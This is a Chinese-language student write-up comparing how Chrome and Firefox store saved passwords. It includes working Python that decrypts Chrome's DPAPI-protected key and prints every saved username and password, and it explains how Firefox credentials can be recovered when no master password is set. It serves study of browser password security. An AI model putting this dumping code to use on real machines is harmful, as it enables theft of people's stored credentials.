### *Project18：比较Firefox和Chrome的记住密码插件的实现区别

####  Chrome记住密码实现

在windows系统中，Chrome中保存的密码先被二次加密，然后被保存在SQLite数据库文件中，位置如下：
> AppData\Local\Google\Chrome\User Data\ Local State

使用工具SQLiteStudio读取数据库文件：

![](https://img1.imgtp.com/2023/07/13/sKf7doz2.png)

可进一步查看加密后的密码16进制：

![](https://img1.imgtp.com/2023/07/13/QRDK7YD0.png)

编写脚本将此数据导出：

```python
from os import getenv
import sqlite3
import binascii
conn = sqlite3.connect(getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    print (binascii.b2a_hex(result[2]))
```



参考Chromium开源代码，找到Chrome做二次加密的方法： 通过Windows API CryptProtectData()实现。

参考https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx获得关键信息：

**对应解密函数为CryptUnprotectData**

参考地址：https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx获得信息

**只有与加密数据的用户具有相同登录凭据的用户才能解密数据**

也就是说，只能在当前用户的凭据下解密数据，即Chrome使用windows账户密钥去加密chrome口令并存储在本地，所以只要登录了windows账户即可通过解密获取Chrome保存的各种口令。

通过查阅资料可知chrome将用户密钥存储在：

> AppData\Local\Google\Chrome\User Data\ Local State

加密密钥是通过 Base64 编码进行存储的,通过访问Local State文件并进行解密即可获得密钥：

```python
local_state = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State'
def getkey():
    with open(local_state, 'r', encoding='utf-8') as f:
        base64_encrypted_key = json.load(f)['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(base64_encrypted_key)
    key= win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return key
```

对文本进行解密：

```python
def decrypt(key, text, salt=None):
    nonce, cipher_bytes = text[3:15], text[15:]
    aes_gcm = AESGCM(key)
    return aes_gcm.decrypt(nonce, cipher_bytes, salt).decode('utf-8')
```

获取账户和口令：

```python
def getpassword(key):
    conn = sqlite3.connect(getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data")
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for result in cursor.fetchall():
        # print (binascii.b2a_hex(result[2]))
        print("账号：",result[1])
        password = decrypt(key, result[2])
        print("密码：",password)
```

![](https://img1.imgtp.com/2023/07/13/q12B9pRc.png)

#### FireFox记住密码

为满足开发者创建满足各种安全标准的应用程序，Mozilla开发了一个叫做“Network Security Services”,或叫NSS的开源库。Firefox使用其中一个叫做”Security Decoder Ring”，或叫SDR的API来帮助实现账号证书的加密和解密函数。firefox使用它完成加密:

当一个Firefox配置文件被首次创建时，一个叫做SDR的随机key和一个Salt(译者注：Salt，在密码学中，是指通过在密码任意固定位置插入特定的字符串，让散列后的结果和使用原始密码的散列结果不相符，这种过程称之为“加盐”)就会被创建并存储在一个名为“key3.db”的文件中。利用这个key和盐，使用3DES加密算法来加密用户名和密码。密文是Base64编码的，并存储在一个叫做signons.sqlite的sqlite数据库中。Signons.sqlite和key3.db文件均位于%APPDATA%\Mozilla\Firefox\Profiles\[random_profile]目录。

所以我们要做的就是得到SDR密钥。正如此处解释的，这个key被保存在一个叫PCKS#11软件“令牌”的容器中。该令牌被封装进入内部编号为PKCS#11的“槽位”中。因此需要访问该槽位来破译账户证书。

还有一个问题，这个SDR也是用3DES(DES-EDE-CBC)算法加密的。解密密钥是Mozilla叫做“主密码”的hash值，以及一个位于key3.db文件中对应的叫做“全局盐”的值。

Firefox用户可以在浏览器的设置中设定主密码，但关键是好多用户不知道这个特性。正如我们看到的，用户整个账号证书的完整性链条依赖于安全设置中选择的密码，它是攻击者唯一不知道的值。如果用户使用一个强健的主密码，那么攻击者想要恢复存储的证书是不太可能的。

那么——如果用户没有设置主密码，空密码就会被使用。这意味着攻击者可以提取全局盐，获得它与空密码做hash运算结果，然后使用该结果破译SDR密钥。再用破译的SDR密钥危害用户证书。

该过程看起来就是这样：

![](https://image.woshipm.com/wp-files/2013/07/2f5442265b1f3d8c4ef0a71f1c51d9c1.jpg)

负责证书解密的主要函数是PK11SDR_Decrypt。此处不再展示整个函数，仅分别列出如下被调用的函数：

```python
PK11_GetInternalKeySlot() //得到内部key槽

PK11_Authenticate() //使用主密码对slot鉴权

PK11_FindFixedKey() //从slot中获得SDR密钥

Pk11_Decrypt() //使用SDR密钥破译Base64编码的数据
```

至于破译密码的示例代码，过程有点复杂，此处就不再累述了。在github上可以找到相关开源项目

> https://github.com/lclevy/firepwd/blob/master/firepwd.py

#### 比较

相比于chrome浏览器，firefox记住密码功能实现更复杂，安全性更高

#### 参考：https://www.woshipm.com/pmd/35985.html
